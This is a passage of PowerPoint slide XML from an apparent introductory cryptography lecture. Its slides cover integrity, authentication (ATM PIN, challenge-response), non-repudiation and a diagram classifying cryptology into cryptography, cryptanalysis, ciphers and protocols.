            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>D W W D F N D W G D Z Q</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Integrity</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="827"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An unbroken wax seal on an envelop ensures integrity.</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The unique unbroken seal ensures no one has read the contents.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="828" name="Picture 61" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3505320" y="3809880"/>
            <a:ext cx="3125520" cy="2444400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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9"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Authentication</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="830" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="380952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An ATM Personal Information Number (PIN) is required for authentication.</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The PIN is a shared secret between a bank account holder and the financial institution.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="561"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="831" name="Picture 6" descr="42-18832731"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" t="8415" r="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5867280" y="1676520"/>
            <a:ext cx="2819160" cy="2581920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="832" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143240" y="4572000"/>
            <a:ext cx="4543200" cy="1695240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="833" name="TextBox 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143240" y="6054120"/>
            <a:ext cx="4543200" cy="308520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill rotWithShape="0">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="d0d0d0"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="ededed"/>
              </a:gs>
            </a:gsLst>
            <a:lin ang="16200000"/>
          </a:gradFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="39960" dir="5400000" dist="20160" rotWithShape="0">
              <a:srgbClr val="000000">
                <a:alpha val="38000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="dk1"/>
          </a:lnRef>
          <a:fillRef idx="2">
            <a:schemeClr val="dk1"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="dk1"/>
          </a:effectRef>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a9432b"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Challenge response authentication protocol</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Non-Repudiation</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="835"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00ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Source repudiation</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>: provides assurance to the recipient that the message was actually originated by the sender and not someone masquerading as the sender</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00ff"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Message repudiation</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>: prevents the sender from claiming that they never sent the message in the first place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Offered by Public Key Crypto</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de-DE" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Classification of the Field of Cryptology</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="837" name="Group 54"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4932360" y="1874880"/>
            <a:ext cx="1800000" cy="462960"/>
            <a:chOff x="4932360" y="1874880"/>
            <a:chExt cx="1800000" cy="462960"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="838" name="AutoShape 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4932360" y="1906560"/>
              <a:ext cx="1800000" cy="431280"/>
            </a:xfrm>
            <a:prstGeom prst="flowChartTerminator">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:miter/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="839" name="Text Box 29"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5148360" y="1874880"/>
              <a:ext cx="936360" cy="304560"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="840" name="Text Box 30"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5003640" y="1978200"/>
              <a:ext cx="1728360" cy="274680"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
          <p:txBody>
            <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPts val="1001"/>
                </a:spcBef>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                </a:rPr>
                <a:t>Cryptology</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="841" name="Group 62"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3132000" y="2338200"/>
            <a:ext cx="5329080" cy="1079280"/>
            <a:chOff x="3132000" y="2338200"/>
            <a:chExt cx="5329080" cy="1079280"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="842" name="Group 55"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="3132000" y="2986200"/>
              <a:ext cx="1800000" cy="431280"/>
              <a:chOff x="3132000" y="2986200"/>
              <a:chExt cx="1800000" cy="431280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="843" name="AutoShape 23"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3132000" y="2986200"/>
                <a:ext cx="1800000" cy="431280"/>
              </a:xfrm>
              <a:prstGeom prst="flowChartTerminator">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="844" name="Text Box 31"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3203640" y="3057480"/>
                <a:ext cx="1728360" cy="274680"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
            <p:txBody>
              <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="90000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="1001"/>
                  </a:spcBef>
                  <a:buNone/>
                </a:pPr>
                <a:r>
                  <a:rPr b="1" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Arial"/>
                  </a:rPr>
                  <a:t>Cryptography</a:t>
                </a:r>
                <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                  <a:latin typeface="Arial"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="845" name="Group 56"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6661080" y="2986200"/>
              <a:ext cx="1800000" cy="431280"/>
              <a:chOff x="6661080" y="2986200"/>
              <a:chExt cx="1800000" cy="431280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="846" name="AutoShape 22"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6661080" y="2986200"/>
                <a:ext cx="1800000" cy="431280"/>
              </a:xfrm>
              <a:prstGeom prst="flowChartTerminator">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="847" name="Text Box 32"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6732720" y="3057480"/>
                <a:ext cx="1728360" cy="274680"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
            <p:txBody>
              <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="90000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="1001"/>
                  </a:spcBef>
                  <a:buNone/>
                </a:pPr>
                <a:r>
                  <a:rPr b="1" lang="de-DE" sz="2000" spc="-1" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Arial"/>
                  </a:rPr>
                  <a:t>Cryptanalysis</a:t>
                </a:r>
                <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                  <a:latin typeface="Arial"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="848" name="Line 40"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5795640" y="2338200"/>
              <a:ext cx="360" cy="287280"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="849" name="Line 41"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3995640" y="2625480"/>
              <a:ext cx="3600360" cy="360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="850" name="Line 42"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3995640" y="2625480"/>
              <a:ext cx="360" cy="360360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:tailEnd len="med" type="triangle" w="med"/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="851" name="Line 43"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7596000" y="2625480"/>
              <a:ext cx="360" cy="360360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:tailEnd len="med" type="triangle" w="med"/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="852" name="Group 63"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="826920" y="3417840"/>
            <a:ext cx="6408720" cy="1247760"/>
            <a:chOff x="826920" y="3417840"/>
            <a:chExt cx="6408720" cy="1247760"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="853" name="Group 57"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="826920" y="4211640"/>
              <a:ext cx="1801440" cy="431280"/>
              <a:chOff x="826920" y="4211640"/>
              <a:chExt cx="1801440" cy="431280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="854" name="AutoShape 26"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="826920" y="4211640"/>
                <a:ext cx="1800000" cy="431280"/>
              </a:xfrm>
              <a:prstGeom prst="flowChartTerminator">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="855" name="Text Box 33"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="900000" y="4282920"/>
                <a:ext cx="1728360" cy="191880"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
            <p:txBody>
              <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="90000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="700"/>
                  </a:spcBef>
                  <a:buNone/>
                </a:pPr>
                <a:r>
                  <a:rPr b="1" lang="de-DE" sz="1400" spc="-1" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Arial"/>
                  </a:rPr>
                  <a:t>Symmetric Ciphers</a:t>
                </a:r>
                <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                  <a:latin typeface="Arial"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="856" name="Group 58"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="3132000" y="4211640"/>
              <a:ext cx="1800000" cy="453960"/>
              <a:chOff x="3132000" y="4211640"/>
              <a:chExt cx="1800000" cy="453960"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="857" name="AutoShape 25"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3132000" y="4211640"/>
                <a:ext cx="1800000" cy="431280"/>
              </a:xfrm>
              <a:prstGeom prst="flowChartTerminator">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="858" name="Text Box 34"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3132000" y="4282920"/>
                <a:ext cx="1728360" cy="382680"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
            <p:txBody>
              <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="90000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="700"/>
                  </a:spcBef>
                  <a:buNone/>
                </a:pPr>
                <a:r>
                  <a:rPr b="1" lang="de-DE" sz="1400" spc="-1" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Arial"/>
                  </a:rPr>
                  <a:t>Asymmetric Ciphers</a:t>
                </a:r>
                <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                  <a:latin typeface="Arial"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="859" name="Group 59"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5435640" y="4210200"/>
              <a:ext cx="1800000" cy="431280"/>
              <a:chOff x="5435640" y="4210200"/>
              <a:chExt cx="1800000" cy="431280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="860" name="AutoShape 24"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5435640" y="4210200"/>
                <a:ext cx="1800000" cy="431280"/>
              </a:xfrm>
              <a:prstGeom prst="flowChartTerminator">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="9525">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="861" name="Text Box 35"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5435640" y="4281480"/>
                <a:ext cx="1728360" cy="191880"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:style>
              <a:lnRef idx="0"/>
              <a:fillRef idx="0"/>
              <a:effectRef idx="0"/>
              <a:fontRef idx="minor"/>
            </p:style>
            <p:txBody>
              <a:bodyPr lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:p>
                <a:pPr algn="ctr">
                  <a:lnSpc>
                    <a:spcPct val="90000"/>
                  </a:lnSpc>
                  <a:spcBef>
                    <a:spcPts val="700"/>
                  </a:spcBef>
                  <a:buNone/>
                </a:pPr>
                <a:r>
                  <a:rPr b="1" lang="de-DE" sz="1400" spc="-1" strike="noStrike">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Arial"/>
                  </a:rPr>
                  <a:t>Protocols </a:t>
                </a:r>
                <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                  <a:latin typeface="Arial"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="862" name="Line 44"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3995640" y="3417840"/>
              <a:ext cx="360" cy="360360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="863" name="Line 46"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1763640" y="3778200"/>
              <a:ext cx="4537080" cy="360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
